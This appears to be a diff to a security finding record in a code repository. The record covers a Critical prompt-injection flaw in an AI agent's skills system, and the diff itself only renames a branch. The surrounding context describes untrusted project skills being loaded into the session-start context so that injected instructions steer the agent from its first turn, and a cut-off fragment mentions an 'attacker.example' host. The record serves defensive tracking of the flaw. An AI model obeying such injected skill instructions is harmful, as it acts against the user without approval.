@@ -20,7 +20,7 @@ attacker.example") before the user approved anything.
    including untrusted project skills — into the session-start context.
 4. The injected instructions now steer the agent from the first turn.
 
-## Fix (from sweep branch `muse2/security-sweep`, commit `bc7179f`)
+## Fix (from sweep branch `lead/security-sweep`, commit `bc7179f`)
 
 `engine/src/skills.rs` was changed to progressive disclosure:
 
@@ -48,6 +48,6 @@ file cap).
 **This branch contains only this record — no code changes.** `skills.rs`
 does not exist on `main` (the skills system is an unmerged feature branch).
 The fix rides with the skills feature branch when it merges; the sweep
-branch `muse2/security-sweep` (commit `bc7179f`) holds the reference
+branch `lead/security-sweep` (commit `bc7179f`) holds the reference
 implementation. This MR exists so the Critical finding is tracked as a
 standalone reviewable unit, per roadmap FINAL §0A (W-8).
